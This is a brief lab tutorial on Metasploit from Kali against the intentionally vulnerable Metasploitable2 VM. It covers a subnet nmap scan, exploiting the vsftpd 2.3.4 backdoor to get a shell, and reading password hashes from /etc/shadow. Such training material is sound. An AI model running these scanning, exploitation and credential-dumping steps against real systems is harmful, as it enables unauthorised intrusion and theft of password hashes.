## Exploitation (Metasploit)
Metasploit is an open source platform for vulnerability research, exploit development, and the creation of custom security tools.

Here, we'll use it to attack the Metasploitable2 VM

#### Getting started
- Update and upgrade Kali
`sudo apt update && sudo apt upgrade`

- Start the postgreSQL service - Metasploit uses this as its backend
`sudo systemctl start postgresql`

- Initialise the Metasploit PostgreSQL Database (you only run this ONCE)
`sudo msfdb init`

- Launch msfconsole
`msfconsole`

- Verify Database connectivity
```bash
msf6> db_status
# Should show [*] Connected to msf. Connection type: post
```

- Create a workspace for the exploit
`workspace -a metasploitable2-exploit`
> To select this workspace in future, type: `workspace metasploitable2-exploit`

- Run nmap over the subnet of the target VM:
`db_nmap -A <TARGET-IP>/24

- To view hosts found in the scan:
`hosts`

- Verify services found in the scan:
`services`

FTP servers running:
```bash
vsftpd 2.3.4
ProFTPD 1.3.1
```

## Exploiting  VSFTPD
search for the first target FTP application - VSFTPD
`search type:exploit name:vsftpd`

- Select the exploit you found above
```bash
msf6> use exploit/unix/ftp/vsftpd...
```
- to gain more info about the exploit
`info`

We have 2 required fields: RHOSTS and RPORT (R - Remote)

```bash
msf6> set RHOSTS aaa.bbb.ccc.ddd   # Must set remost host (IP address of Metasploitable2 VM)
msf6> set RPORT XXXX     # Must set remote port
```
- Run the exploit
```bash
msf6> exploit
```

The exploit brings us into a shell environment where we can run linux commands e.g:
`whoami`
`uname -a`

At this point i got thrown back into the msf6 console, as the spawned shell is very fragile. However, you can try getting back in using:
`sessions -i <id>`

- You can get ID from the previous command that created the shell (normally `1`)


- obtain the hashed passwords from the `/etc/shadow` file
`cat /etc/shadow | grep '$1'`

